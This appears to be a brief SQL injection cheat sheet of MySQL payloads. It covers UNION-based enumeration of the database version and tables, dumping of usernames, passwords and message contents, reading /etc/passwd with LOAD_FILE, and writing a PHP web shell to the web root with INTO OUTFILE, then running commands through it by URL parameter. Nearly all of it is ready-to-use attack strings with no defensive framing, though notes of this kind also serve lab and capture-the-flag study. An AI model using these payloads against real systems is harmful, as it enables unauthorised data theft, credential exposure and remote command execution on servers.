# uploading File with Mysql

Basic:
```
<VALUE>' union select 1, @@version-- -
```
```
<VALUE>' union select 1, table_name FROM information_schema.tables-- -
```

> uploading:
```
<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#
```
> then go to http://example.com/shell.php?cmd=`<exec>`

> uploading file Says 'Hello from SQLI'
```
<VALUE>'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
```
>then exec: `curl http://example/shell.php`
# List For Extract Data

1: 
```
12 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
```
2: 
```
12 union select 1,group_concat(username,password),3,4 from users   // select what u see in Data //
```
3: 
```
12 union select 1,group_concat(message_content),3,4 from messages    
```
# read files
1: 
```
'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
```
